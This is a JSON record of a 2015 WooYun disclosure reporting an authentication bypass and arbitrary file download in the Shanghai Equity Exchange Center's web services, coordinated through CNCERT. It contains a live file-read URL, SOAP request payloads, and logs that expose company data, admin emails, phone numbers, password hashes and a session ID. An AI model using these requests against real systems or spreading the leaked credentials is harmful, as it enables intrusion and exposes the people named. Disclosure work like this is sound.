{"id": 14978, "wybug_id": "wooyun-2015-0117122", "wybug_title": "上海股权托管中心托管转让企业股东数据、投资者金融类数据存在泄露风险（区域四版市场技术能力堪忧）", "wybug_corp": "上海股权托管中心", "wybug_author": "架子猪", "wybug_date": "2015-06-01 14:45", "wybug_open_date": "2015-07-20 17:12", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "后台被猜解", "资金安全", "账户", "用户密码泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向公众公开  简要描述： 上海股权托管交易中心经国务院同意，由上海市人民政府批准设立，遵循中国证监会对中国多层次资本市场体系建设的统一要求，是上海市国际金融中心建设的重要部份。1、在业务系统建设方面存在系统架构性风险，可任何地点任意时间绕过鉴权体系，全国托挂牌在上海股权交易中心的企业信息泄露，客户账户存在泄露，股东信息存在泄露。2、系统代码编写存在问题，系统代码可任意下载；3、系统运维存在重点疏忽，所有登记挂牌的企业和资金存在泄漏风险。 详细说明：  1、在业务系统建设方面存在系统架构性风险，可任何地点任意时间绕过鉴权体系。系统采用WEB service架构进行服务者和数据消费者进行交互，服务鉴权SIGN体系未验证请求来源；2、系统代码可以被下载http://www.china-seeq.com/questionInves/pilupdf.jsp?url=/home/tomcat/apache-tomcat-6.0.35/conf/server.xml\n\n3、由于SOA架构鉴权体系问题所有用户信息全部泄漏。\n---------------------------ID: 848Address: http://localhost:8080/see-core/ws/adminUser?wsdlEncoding: UTF-8Content-Type: text/xmlHeaders: {Accept=[*/*], Connection=[Keep-Alive], SOAPAction=[\"\"]}Payload: <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><ns2:queryComPany xmlns:ns2=\"http://ws.admin.core.see.com/\"><ns2:adminUserRzComPanyRequest><sign>ce7b79ac3348b4785c32e9d270505e6e</sign><trans_timestamp>20150529082159</trans_timestamp></ns2:adminUserRzComPanyRequest></ns2:queryComPany></soap:Body></soap:Envelope>--------------------------------------2015-05-29 08:22:00,444-[HL] INFO http-8080-45 org.apache.cxf.interceptor.LoggingInInterceptor - Inbound Message----------------------------ID: 848Response-Code: 200Encoding: UTF-8Content-Type: text/xml;charset=UTF-8Headers: {content-type=[text/xml;charset=UTF-8], Date=[Fri, 29 May 2015 00:22:00 GMT], Server=[Apache-Coyote/1.1], transfer-encoding=[chunked]}Messages: Message (saved to tmp file):Filename: /home/tomcat/apache-tomcat-6.0.35/temp/cxf-tmp-341347/cos169525tmp(message truncated to 102400 bytes)Payload: <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><ns2:queryComPanyResponse xmlns:ns2=\"http://ws.admin.core.see.com/\"><ns2:adminUserRzComPanyResponse><companyInfolist><capitalType>01</capitalType><companyEname>NEWBIOCORE MEDICAL TECHNOLOGY, INC</companyEname><companyName>上海纽比医疗科技有限公司</companyName><companyProfile>公司所处行业为医疗设备业，细分行业属于医疗器械制造，公司主要从事医疗技术开发和医疗器械生产业务，主要产品为医疗器材。公司的创立初衷为“致力于发掘国内外领先医疗科技技术产品，整合具有领航实力的医疗高科技资源，通过科技创新和制度创新，实现科技转化服务公众健康。”公司拥有已拥有包括：晶体眼后房屈光晶体（PC-PRL）；显微角膜散光定量仪；可吸收泪道塞；白内障人工晶体等多项已经成型的高科技医学产品，拥有产品皆通过临床验证，已实现生产销售。</companyProfile><companytype>1</companytype><compnayRname>纽比医疗</compnayRname><coopCode>200001</coopCode><createtime>2013-08-04T00:24:56+08:00</createtime><delectFlag>false</delectFlag><id>1000</id><industry>370501-医疗器械</industry><legalPerson>朱东</legalPerson><linFlag>true</linFlag><nianFlag>true</nianFlag><registAddress>上海市闵行区金都室</registAddress><registCapital>60000000</registCapital><shenFlag>false</shenFlag><stopFlag>0</stopFlag><tranvelNum>310112001263470</tranvelNum><tranvelType>01</tranvelType><unitEmail>new_@126.com</unitEmail><unitFaxP>021</unitFaxP><unitName>朱辉东</unitName><unitPost>200125</unitPost><unitTel>61010078</unitTel><updatetime>2013-08-19T16:43:28+08:00</updatetime><userId>1022</userId><utilTelP>021</utilTelP><zhubanFlag>true</zhubanFlag><zhubanId>1006</zhubanId></companyInfolist><companyInfolist><capitalType>01</capitalType><companyEname>SHANGHAI ZHIHANG INVESTMENT MANAGEMENT CO.,LTD</companyEname><companyName>上海知行投资管理有公司</companyName><companyProfile>上海知行投资管理有限公司成立[公司成立日期]于2006年3月16日，公司[公司的定位]致力于做商业模式型融资平台，知而后行。公司以分析商业模式为入口，拟打造中小企业全生命周期的融资平台，为其提供债券和股权的融资服务。公司[公司的主要产品]一改传统的债权融资过分倚重抵押物的做法，采取以商业模式分析为重点，以信用贷款为开门性产品，整合政府、银行及VC、PE等债权、股权资源，为中小企等提供一站式平台服务。多年来[公司的好的业绩]，公司已为迪信通、新奇特等1,000多家中小企业成功提供融资服务。\n   漏洞证明：  1、发起WEBSERVICE请求\n\n返回结果：\n2015-05-29 08:05:14,343-[HL] DEBUG http-8080-165 com.yuhong.see.security.UsernamePasswordCaptchaAuthenticationFilter - Request is to process authentication2015-05-29 08:05:14,344-[HL] DEBUG http-8080-165 com.yuhong.see.service.UserService - queryAdminUserDetail \t START2015-05-29 08:05:14,345-[HL] INFO http-8080-165 org.apache.cxf.interceptor.LoggingOutInterceptor - Outbound Message---------------------------ID: 822Address: http://localhost:8080/see-core/ws/adminUser?wsdlEncoding: UTF-8Content-Type: text/xmlHeaders: {Accept=[*/*], Connection=[Keep-Alive], SOAPAction=[\"\"]}Payload: <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><ns2:queryAdminUserDetail xmlns:ns2=\"http://ws.admin.core.see.com/\"><ns2:adminQueryRoleInfoRequest><sign>907a783018f4ac209814c5d895c6368f</sign><trans_timestamp>20150529080514</trans_timestamp><username>10000056</username></ns2:adminQueryRoleInfoRequest></ns2:queryAdminUserDetail></soap:Body></soap:Envelope>\n--------------------------------------2015-05-29 08:05:14,370-[HL] INFO http-8080-165 org.apache.cxf.interceptor.LoggingInInterceptor - Inbound Message\n----------------------------ID: 822Response-Code: 200Encoding: UTF-8Content-Type: text/xml;charset=UTF-8Headers: {Content-Length=[1249], content-type=[text/xml;charset=UTF-8], Date=[Fri, 29 May 2015 00:05:14 GMT], Server=[Apache-Coyote/1.1]}Payload: <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><ns2:queryAdminUserDetailResponse xmlns:ns2=\"http://ws.admin.core.see.com/\"><ns2:adminQueryRoleInfoResponse><desc>成功,系统处理正常</desc><queryRoleInfo><authoritielist><authordesc></authordesc><authority>业务部门信息披露</authority><authoritycode>ROLE_20150504141058</authoritycode><createtime>2015-05-04</createtime><id>1040</id><updatetime>2015-05-04</updatetime><username>admin</username></authoritielist><email>chenzh@china-see.com</email><empno>000</empno><moblie>13811111111</moblie><password>5c4501c2cb8fd0831e2jhkadf</password><renaeme>陈子浩/renaeme><user><createtime>2013-02-01T19:21:35+08:00</createtime><creatorId>0</creatorId><email>admin@see.com</email><empno>11</empno><enabled>true</enabled><id>61</id><mobile>13333333333</mobile><password>5c4501c2cb8fd0831e2jhkadf</password><realname>系统管理员</realname><remark></remark><updatetime>2013-02-01T19:21:35+08:00</updatetime><username>admin</username></user><username>10000056</username></queryRoleInfo><rcode>0000</rcode><sign>88576709789013de7196dd823b0e20a8</sign></ns2:adminQueryRoleInfoResponse></ns2:queryAdminUserDetailResponse></soap:Body></soap:Envelope>--------------------------------------2015-05-29 08:05:14,371-[HL] INFO http-8080-165 com.yuhong.see.service.UserService - queryAdminUserDetail Success!2015-05-29 08:05:14,371-[HL] DEBUG http-8080-165 com.yuhong.see.service.UserService - queryAdminUserDetail \t END2015-05-29 08:05:14,371-[HL] DEBUG http-8080-165 com.yuhong.see.security.JPAUserDetailsService - EXECUTE FIND USER BY USERNAME:10000056.2015-05-29 08:05:14,371-[HL] DEBUG http-8080-165 com.yuhong.see.security.JPAUserDetailsService - MANAGED FIND THE USER2015-05-29 08:05:14,374-[HL] INFO http-8080-165 com.yuhong.see.security.JPAUserDetailsService - @com.yuhong.see.bean.AdminUser{\tenabled:true\tauths:[{authority:业务部门信息披露,authorDesc,code:ROLE_20150504141058}]\tupdatetime:null\tempNum:000\tremark:\tdepartment:null\tpassword_r:5c4501c2cb8fd0831e2jhkadf\tpassword:5c4501c2cb8fd0831e2jhkadf\tcreator:null\tisLocked:null\tcreatetime:null\tusername:10000056\tisExpired:null\tauthorities:[{authority:业务部门信息披露,authorDesc,code:ROLE_20150504141058}]\temail:chenzh@china-see.com\trealname:陈子浩\tmobile:13811111111}2015-05-29 08:05:14,374-[HL] DEBUG http-8080-165 com.yuhong.see.security.UsernamePasswordCaptchaAuthenticationFilter - Authentication success. Updating SecurityContextHolder to contain: org.springframework.security.authentication.UsernamePasswordAuthenticationToken@788ce533: Principal: com.yuhong.see.bean.AdminUser@312a941f; Credentials: [PROTECTED]; Authenticated: true; Details: org.springframework.security.web.authentication.WebAuthenticationDetails@ffff8868: RemoteIpAddress: 116.228.91.12; SessionId: 79D53C2A793B8D4DECB7C33E28F0F518; Granted Authorities: {authority:业务部门信息披露,authorDesc,code:ROLE_20150504141058}2015-05-29 08:05:22,261-[HL] INFO http-8080-61 org.apache.cxf.interceptor.LoggingOutInterceptor - Outbound Message\n2、暴露所有接口问题：\n\n-   修复方案：  1、对整体系统架构进行升级，抛弃WEBSERVICE CXF架构。2、系统代码在逻辑安全性上加强；3、运维人员信息安全意识加强，对于敏感信息文件应做好归档处理；   版权声明：转载请注明来源 架子猪@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-06-05 17:10 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT协调相关主管部门通报,由其后续协调网站管理单位处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}